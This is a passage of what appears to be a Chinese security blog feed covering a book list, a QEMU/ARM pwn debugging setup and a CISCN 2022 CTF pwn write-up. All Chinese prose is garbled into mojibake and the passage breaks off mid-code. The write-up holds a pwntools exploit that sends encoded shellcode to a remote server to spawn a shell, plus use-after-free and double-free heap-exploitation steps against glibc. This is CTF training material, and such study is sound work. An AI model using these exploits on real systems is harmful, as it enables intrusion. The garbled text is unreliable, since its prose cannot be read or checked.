href="#ã€ŠC-åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹" class="headerlink" title="ã€ŠC++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹"></a>ã€ŠC++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹</h2><blockquote><p>æœ¬ä¹¦æ—¢æ˜¯ä¸€æœ¬å…¨é¢è€Œç³»ç»Ÿåœ°è®²è§£åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯çš„å®‰å…¨ç±»ä¸“è‘—ï¼Œåˆæ˜¯ä¸€éƒ¨æ·±åˆ»æ­ç¤ºC++å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç¨‹åºè®¾è®¡ç±»è‘—ä½œã€‚</p></blockquote><hr><h2 id="ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹"><a href="#ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹" class="headerlink" title="ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹"></a>ã€Šé«˜çº§ç¼–è¯‘å™¨è®¾è®¡ä¸å®ç°ã€‹</h2><blockquote><p>æœ¬ä¹¦ä¸šå†…ä¿—ç§°â€œé²¸ä¹¦â€ï¼Œå®ƒæ˜¯ç¼–è¯‘å™¨é¢†åŸŸæœ€ä¸ºç»å…¸çš„ä¸‰æœ¬ä¹¦ä¹‹ä¸€ï¼Œä½†å†…å®¹æ›´çªå‡ºç¼–è¯‘å™¨çš„åç«¯ä¼˜åŒ–éƒ¨åˆ†ã€‚</p></blockquote><hr><h2 id="ã€Šä¹Œåˆä¹‹ä¼—ã€‹"><a href="#ã€Šä¹Œåˆä¹‹ä¼—ã€‹" class="headerlink" title="ã€Šä¹Œåˆä¹‹ä¼—ã€‹"></a>ã€Šä¹Œåˆä¹‹ä¼—ã€‹</h2><blockquote><p>æˆ‘ä»¬ä½œä¸ºç‹¬ç«‹çš„ä¸ªäººï¼Œå¦‚ä½•åœ¨çº·çº·æ‰°æ‰°çš„ä¿¡æ¯ç¤¾ä¼šä¸­ä¿æŒå†·é™ï¼Œä¸è¢«ä¹Œåˆä¹‹ä¼—æ‰€è£¹æŒŸï¼Œè¾©è¯åœ°è¯»å®Œè¿™æœ¬ä¹¦ï¼Œä¿æŒç‹¬ç«‹çš„æ€è€ƒï¼Œç›¸ä¿¡ä½ èƒ½æœ‰æ‰€æ”¶è·ã€‚</p></blockquote><hr><h2 id="ã€Šå¨±ä¹è‡³æ­»ã€‹"><a href="#ã€Šå¨±ä¹è‡³æ­»ã€‹" class="headerlink" title="ã€Šå¨±ä¹è‡³æ­»ã€‹"></a>ã€Šå¨±ä¹è‡³æ­»ã€‹</h2><blockquote><p>åœ¨è¯¥ä¹¦ä¸­ï¼Œæ³¢å…¹æ›¼æ·±å…¥å‰–æäº†ä»¥ç”µè§†ä¸ºä¸»çš„æ–°åª’ä½“å¯¹äººæ€æƒ³è®¤è¯†ã€è®¤çŸ¥æ–¹æ³•ä¹ƒè‡³æ•´ä¸ªç¤¾ä¼šæ–‡åŒ–å‘å±•è¶‹å‘çš„å½±å“ï¼Œä»¤äººæ·±çœï¼Œå¹¶è®¤è¯†åˆ°åª’ä»‹å±æœºã€‚</p></blockquote><hr><h2 id="ã€ŠLinux-äºŒè¿›åˆ¶åˆ†æã€‹"><a href="#ã€ŠLinux-äºŒè¿›åˆ¶åˆ†æã€‹" class="headerlink" title="ã€ŠLinux äºŒè¿›åˆ¶åˆ†æã€‹"></a>ã€ŠLinux äºŒè¿›åˆ¶åˆ†æã€‹</h2><blockquote><p>æœ¬ä¹¦æ·±å…¥çš„å‰–æäº† Linux ELFçš„å·¥ä½œæœºåˆ¶ï¼Œæœ‰åŠ©äºä¿¡æ¯å®‰å…¨ä»ä¸šäººå‘˜æ›´å¥½çš„åˆ†ææ¼æ´ã€ç—…æ¯’ä»¥åŠæ¶æ„è½¯ä»¶ï¼Œä»è€Œæ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆã€‚</p></blockquote><hr><h2 id="ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹"><a href="#ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹" class="headerlink" title="ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹"></a>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</h2><blockquote><p>æˆ‘ä¸æ˜¯ä¸€ä¸ªåˆæ ¼çš„ç¨‹åºå‘˜ğŸ˜­</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>QEMU &amp; arm ç®€æ˜“pwnç¯å¢ƒæ­å»º</title>
    <link href="/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å¡«å‘äº†ï¼Œå¡«å‘äº†ï¼å­¦äº†å †ä¹‹åå¾ˆä¹…æ²¡æœ‰å­¦æ–°ä¸œè¥¿äº†ï¼Œæ¥å…¥é—¨ä¸‹armæ¶æ„ä¸‹çš„PWNï¼Œä¸ºå›½èµ›æ‰“ä¸€ç‚¹åŸºç¡€ã€‚</p></blockquote><h2 id="ç¯å¢ƒæ­å»º-Ubuntu-20-04"><a href="#ç¯å¢ƒæ­å»º-Ubuntu-20-04" class="headerlink" title="ç¯å¢ƒæ­å»º(Ubuntu 20.04)"></a>ç¯å¢ƒæ­å»º(Ubuntu 20.04)</h2><h3 id="å®‰è£…QEMU"><a href="#å®‰è£…QEMU" class="headerlink" title="å®‰è£…QEMU"></a>å®‰è£…QEMU</h3><blockquote><p>QEMUæ˜¯ä¸€ç§é€šç”¨çš„å¼€æºè®¡ç®—æœºä»¿çœŸå™¨å’Œè™šæ‹Ÿå™¨ã€‚QEMUå…±æœ‰ä¸¤ç§æ“ä½œæ¨¡å¼<br><strong>å…¨ç³»ç»Ÿä»¿çœŸ</strong>ï¼šèƒ½å¤Ÿåœ¨ä»»æ„æ”¯æŒçš„æ¶æ„ä¸Šä¸ºä»»ä½•æœºå™¨è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿ<br><strong>ç”¨æˆ·æ¨¡å¼ä»¿çœŸ</strong>ï¼šèƒ½å¤Ÿåœ¨ä»»æ„æ”¯æŒçš„æ¶æ„ä¸Šä¸ºå¦ä¸€ä¸ªLinux&#x2F;BSDè¿è¡Œç¨‹åº å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨linuxæ“ä½œç³»ç»Ÿä¸­å®‰è£…å®ƒï¼Œç„¶åç”¨å®ƒæ¥è°ƒè¯•å…¶å®ƒæ¶æ„å¹³å°çš„ç¨‹åºã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##é¦–å…ˆå®‰è£…qemu</span><br>sudo apt update<br>sudo apt install qemu<br></code></pre></td></tr></table></figure><p>å®‰è£…å¥½åå¯ä»¥ç”¨tabè¡¥å…¨çœ‹çœ‹æ˜¯å¦æ­£ç¡®å®‰è£…ã€‚åœ¨å®‰è£…qemuåï¼Œå¯¹äºé™æ€é“¾æ¥çš„armç¨‹åºå°±å·²ç»å¯ä»¥ç›´æ¥è¿è¡Œäº†ï¼Œä½¿ç”¨å‘½ä»¤<code>qemu-arm prog</code>è¿è¡Œ32ä½çš„armç¨‹åºï¼Œå…¶ä¸­progæŒ‡ä»£ç¨‹åºå,å¯¹äº64ä½ç¨‹åºä½¿ç”¨<code>qemu-aarch64</code>ä½†å¯¹äºåŠ¨æ€é“¾æ¥çš„ç¨‹åºè¿˜æ˜¯æ— æ³•æ­£å¸¸è¿è¡Œï¼Œæ­¤æ—¶éœ€è¦å®‰è£…å¯¹åº”æ¶æ„çš„åŠ¨æ€é“¾æ¥åº“æ‰å¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><p><img src="/img/article/qemu-arm/qemu.png" alt="Untitled"></p><h3 id="å®‰è£…åŠ¨æ€é“¾æ¥åº“"><a href="#å®‰è£…åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="å®‰è£…åŠ¨æ€é“¾æ¥åº“"></a>å®‰è£…åŠ¨æ€é“¾æ¥åº“</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æœç´¢å¯å®‰è£…çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥64ä½ä¸ºä¾‹ï¼Œå®‰è£…debugç‰ˆæœ¬çš„libc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##æœç´¢libc</span><br>sudo apt search <span class="hljs-string">&quot;libc6&quot;</span> | grep arm<br><span class="hljs-comment">##å®‰è£…libc</span><br>sudo apt install libc6-dbg-arm64-cross<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu2.png" alt="Untitled"></p><p>å®‰è£…å®Œåï¼Œåœ¨<code>/usr</code>ç›®å½•ä¸‹ä¼šå‡ºç°<code>aarch64-linux-gnu</code>è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¯¥æ–‡ä»¶å¤¹å³å¯¹åº”åˆšå®‰è£…å¥½çš„arm64ä½libcåº“ï¼Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŒ‡å®šarmç¨‹åºçš„åŠ¨æ€é“¾æ¥å™¨ï¼Œå³å¯è¿è¡Œç¨‹åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./prog<br><span class="hljs-comment">## -g ä»£è¡¨ä¸ºç¨‹åºè¿è¡Œåˆ†é…çš„è¿›ç¨‹ç«¯å£å·ï¼Œä¸€èˆ¬ç”¨äºgdbè°ƒè¯•ï¼Œä¸å¡«æ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ†é…</span><br><span class="hljs-comment">## -L ä»£è¡¨åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å¤¹åœ°å€ï¼Œé™æ€é“¾æ¥ç¨‹åºå¯ä»¥ä¸éœ€è¦</span><br></code></pre></td></tr></table></figure><p><code>qemu-arm</code>æŒ‡çš„æ˜¯<strong>arm32æ¶æ„</strong>ï¼Œç”¨è¿™ä¸ªå‘½ä»¤æ¥è¿è¡Œ32ä½çš„armç¨‹åºï¼Œè€Œ<code>qemu-aarch64</code>å¯¹åº”çš„æ‰æ˜¯<strong>arm64ä½æ¶æ„çš„ç¨‹åº</strong>ï¼Œä¸Šé¢ä¸¤è€…é»˜è®¤éƒ½æ˜¯å°ç«¯ç¨‹åºï¼›<code>qemu-armeb</code>ç”¨æ¥è¿è¡Œ<strong>å¤§ç«¯çš„armç¨‹åº</strong>ã€‚å½“ç„¶åœ¨<strong>ä¸Šé¢å®‰è£…åŒ…æˆªå›¾ä¸­æ˜¾ç¤ºçš„æ˜¯arm64ï¼Œå…¶å®å’Œaarch64æŒ‡çš„æ˜¯åŒä¸€ç§ä½“ç³»ç»“æ„ï¼Œåªä¸è¿‡å‘½åç•¥æœ‰ä¸åŒ</strong>ã€‚</p><h2 id="ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•"><a href="#ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•" class="headerlink" title="ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•"></a>ä½¿ç”¨gdb-multiarchè¿›è¡Œè°ƒè¯•</h2><p>é¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install gdb-multiarch<br></code></pre></td></tr></table></figure><p>ä»¥å¹³å°ä¸Šçš„ez-archä¸ºä¾‹ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨qemuå¯åŠ¨ç¨‹åºï¼Œå¹¶ä¸ºå…¶åˆ†é…ä¸€ä¸ªç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./stack<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ï¼Œæ‰“å¼€qemu-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€[loorain@ubuntu] - [~/dest0g3-520/ez-aarch] - [1568]<br>â””â”€[$] sudo gdb-multiarch                                                                             [22:22:12]<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> architecture aarch64<br>The target architecture is assumed to be aarch64<br>pwndbg&gt; target remote localhost:12345<br>Remote debugging using localhost:12345<br>warning: No executable has been specified and target does not support<br>determining executable automatically.  Try using the <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu3.png" alt="Untitled"></p><p>å¦å¤–åœ¨pwntoolsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥åŠ¨æ€è°ƒè¯•ç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./stack&quot;</span>])<br><span class="hljs-comment">##32armåªéœ€è¦æ›¿æ¢æŒ‡ä»¤ä¸ºqemu-armï¼Œå¹¶æ›´æ¢å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šä¸è¿›è¡Œè°ƒè¯•æ—¶ä¸å»ºè®®ä½¿ç”¨</strong><code>-p</code><strong>ä¸ç„¶å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºåœæ»ï¼Œåªèƒ½ç­‰å¾…gdbé“¾æ¥</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CISCN2022ã€‘åˆèµ›PWNéƒ¨åˆ†writeup</title>
    <link href="/2022/06/04/ciscn2022/"/>
    <url>/2022/06/04/ciscn2022/</url>
    
    <content type="html"><![CDATA[<h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>é¢˜å¦‚å…¶åï¼Œä¸€é“ç®€å•çš„ç­¾åˆ°é¢˜ç›®ï¼Œæ¯”èµ›è¢«æ‰“çƒ‚äº†ã€‚ä¸»è¦åœ¨äºä»£ç åˆ†æï¼Œè¿˜æœ‰å¯æ‰“å°shellcodeçš„åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯githubä¸Šä¸€ä¸ªå¤§ä½¬çš„é¡¹ç›®AE64ï¼Œå¯ä»¥ç”¨æ¥ç”Ÿæˆå¯æ‰“å°çš„shellcodeï¼Œç›¸å½“å¥½ç”¨ï¼Œå¼ºæ¨,é“¾æ¥æ”¾åœ¨è¿™é‡Œã€‚</p><blockquote><p> <a href="https://github.com/veritas501/ae64">veritas501&#x2F;ae64: basic amd64 alphanumeric shellcode encoder (github.com)</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># io = process(&#x27;./login&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;59.110.105.63&#x27;</span>, <span class="hljs-number">29289</span>)<br>payload = <span class="hljs-string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span><br><br>io.sendline(payload)<br><br>sc = AE64()<br><br>shellocde = sc.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;msg:&#x27;</span>+shellocde+<span class="hljs-string">b&#x27;\r\nopt:2\r\n&#x27;</span><br><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p> ä¸€é“å †é¢˜ç›®ï¼Œæ¯”èµ›ç»“æŸä¸€ä¸ªå¤šå°æ—¶æ‰å‹‰å¼ºåšå‡ºæ¥ï¼Œéå¸¸å¯æƒœã€‚ä¸»è¦è¿˜æ˜¯ä¸äº†è§£æ–°libcçš„ä¸€äº›è¿›åˆ¶äº†è§£ï¼Œä¸´æ—¶å­¦äº†ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œæ‰æœ‰ä¸ªåˆæ­¥äº†è§£ã€‚å»ºè®®å…ˆçœ‹å®Œè¿™ç¯‡æ–‡ç« ï¼Œå†æ¥çœ‹æˆ‘çš„wpã€‚</p><blockquote><p> <a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31 | æœ€æ–°å †åˆ©ç”¨æŠ€å·§ï¼Œé€Ÿé€ŸæŸ¥æ”¶ - çŸ¥ä¹ (zhihu.com)</a><br> <a href="http://blog.nsfocus.net/glibc-234/">æµ…è°ˆglibcæ–°ç‰ˆæœ¬ä¿æŠ¤æœºåˆ¶åŠç»•è¿‡æ–¹æ³• â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ (nsfocus.net)</a></p></blockquote><h2 id="ä¼ªä»£ç åˆ†æ"><a href="#ä¼ªä»£ç åˆ†æ" class="headerlink" title="ä¼ªä»£ç åˆ†æ"></a>ä¼ªä»£ç åˆ†æ</h2><p>ç®€å•çœ‹äº†ä¼ªä»£ç åä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªé‡ç‚¹</p><ul><li>freeä¹‹åæ²¡æœ‰ç½®ç©ºï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥é€šè¿‡showæ³„éœ²freechunkçš„å†…å®¹</li></ul><p><img src="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png" alt="img"></p><ul><li><p>æ²¡æœ‰chunkç¼–è¾‘å‡½æ•°ï¼Œåªèƒ½åœ¨mallocçš„æ—¶å€™ç¼–è¾‘chunkå†…å®¹ï¼Œå³æ— æ³•ä¿®æ”¹tcacheçš„flagå†…å®¹ã€‚</p></li><li><p>æœ‰ä¸¤ä¸ªå…¨å±€å˜é‡é™åˆ¶äº†mallocå’Œfreeçš„æ¬¡æ•°ï¼Œfreeä»…èƒ½11æ¬¡ï¼Œmallocæ¬¡æ•°å¾ˆå¤šä¸ç”¨å¤ªæ‹…å¿ƒã€‚</p></li><li><p>æ¯ä¸ªchunkçš„sizeè¢«é™åˆ¶åœ¨0x40ã€‚</p></li></ul><p><img src="https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png" alt="img"></p><h2 id="æ€è·¯æ•´ç†"><a href="#æ€è·¯æ•´ç†" class="headerlink" title="æ€è·¯æ•´ç†"></a>æ€è·¯æ•´ç†</h2><p>æˆ‘ä»¬æ¥çœ‹çœ‹å¯ä»¥æ‹¿åˆ°çš„ä¿¡æ¯æœ‰å“ªäº›ã€‚é¦–å…ˆï¼Œç”±äºæ–°libcçš„æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨uafæ¼æ´è½»æ¾è·å–heapbaseï¼Œè¿™é‡Œçš„keyæ˜¯æ–°libcç¯å¢ƒä¸‹ç”¨æ¥xoræ“ä½œçš„å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png" alt="img"></p><p>å…¶æ¬¡ï¼Œè€ƒè™‘å¦‚ä½•æ³„éœ²libcï¼Œç”±äºå­˜åœ¨UAFï¼Œæˆ‘ä»¬ä¸€èˆ¬å¯ä»¥é€šè¿‡unsortbinæ¥è¿›è¡Œæ³„éœ²ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œæ¯ä¸ªchunkçš„sizeéƒ½ä¸å¤Ÿå¤§ï¼Œå³ä¾¿å¡«æ»¡tacheä¹Ÿåªä¼šè¿›å…¥fastbinï¼Œè€Œä¸æ˜¯unsortbinã€‚åœ¨è¿™é‡Œï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªæ€è·¯</p><ul><li><p>å…¶ä¸€ï¼Œåœ¨ç¨‹åºå¼€å¤´æˆ‘ä»¬è¾“å…¥äº†ä¸€ä¸ªsizeï¼Œå¹¶mallocäº†ä¸€ä¸ª8*sizeçš„chunkç”¨æ¥èµ·åˆ°noteè®°å½•çš„ä½œç”¨ã€‚å³è¿™ä¸ªchunkçš„sizeæ˜¯å¯æ§çš„ï¼Œ<strong>æ›´é‡è¦çš„æ˜¯è¿™ä¸ªchunkæ²¡æœ‰é™åˆ¶å¤§å°</strong>å¦‚æœå¯ä»¥freeè¿™ä¸ªchunkè¿›å…¥unsortbinï¼Œä¾¿å¯ä»¥å®ç°libcçš„æ³„éœ²ã€‚ä½†æ˜¯åœ¨è¿™ç§æ€è·¯ä¸‹ï¼Œè€ƒè™‘å¡«æ»¡tcacheéœ€è¦7æ¬¡freeï¼Œdoublefreeæ§åˆ¶æŒ‡é’ˆæŒ‡å‘notechunkéœ€è¦2-3æ¬¡freeï¼Œæ³„éœ²libcéœ€è¦ä¸€æ¬¡freeï¼Œç„¶åå†æ¬¡doublefreeåŠ«æŒhookã€‚freeçš„æ¬¡æ•°æ˜¾ç„¶è¶…è¿‡11æ¬¡ï¼Œæš‚æ—¶æ— æ³•å®ç°ï¼Œå¦‚æœæœ‰å¤§ä½¬æœ‰æ–¹æ³•é€šè¿‡æ§åˆ¶å¼€å¤´çš„notechunkæ¥è§£å‡ºè¿™é“é¢˜ï¼Œå¸Œæœ›èƒ½æŒ‡ç‚¹ä¸‹æˆ‘ğŸ˜­</p></li><li><p>å…¶äºŒï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªé€ ä¸€ä¸ªtcacheé“¾ï¼Œä½¿å¾—å…¶å®é™…sizeå°äº0x40ï¼Œåˆ©ç”¨æº¢å‡ºæ„é€ ä¼ªé€ å·¨å¤§chunkå¤´å¹¶freeè¿›å…¥unsortbinï¼Œå¾—åˆ°libcã€‚åŒæ—¶åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æº¢å‡ºè½»æ˜“å®Œæˆå¯¹freechunkå†…å®¹çš„æ›´æ”¹ï¼Œä»¥æ­¤åŠ«æŒhook</p></li></ul><p>ä¸‹é¢æˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§æ€è·¯</p><h3 id="ä¸€ã€å¾—åˆ°heapbase"><a href="#ä¸€ã€å¾—åˆ°heapbase" class="headerlink" title="ä¸€ã€å¾—åˆ°heapbase"></a>ä¸€ã€å¾—åˆ°heapbase</h3><p>å¼€å§‹å…ˆç”³è¯·å‡ ä¸ªchunkï¼Œå¤šç”³è¯·çš„é‚£å‡ ä¸ªæ˜¯ç”¨æ¥æ‰©å……å¯æ§å †åŒºåŸŸçš„å¤§å°ï¼Œä¸ºä¼ªé€ çš„å¤§chunkæä¾›ç©ºé—´ï¼Œä¸ç„¶è¦†ç›–è¿›topchunkç¨‹åºä¼šå´©æ‰ã€‚è¿™ä¸ªæ­¥éª¤æ¯”è¾ƒç®€å•ï¼Œå‰é¢ä¹Ÿè°ˆåˆ°äº†ä¸è¿‡å¤šèµ˜è¿°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><h3 id="äºŒã€ä¼ªé€ fastbiné“¾"><a href="#äºŒã€ä¼ªé€ fastbiné“¾" class="headerlink" title="äºŒã€ä¼ªé€ fastbiné“¾"></a>äºŒã€ä¼ªé€ fastbiné“¾</h3><p>è¿™é‡Œæˆ‘ä»¬å…ˆå¡«æ»¡tcache,ç„¶åfree 7å·chunkè¿›å…¥fastbinï¼Œç»“æ„å…¥ä¸‹å›¾æ‰€ç¤ºã€‚ç”±äºæ–°çš„libcæœºåˆ¶ï¼Œè¿™é‡Œçš„fdæŒ‡é’ˆéƒ½è¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥çœ‹èµ·æ¥å¹¶ä¸æ˜¯å¾ˆç›´è§‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double 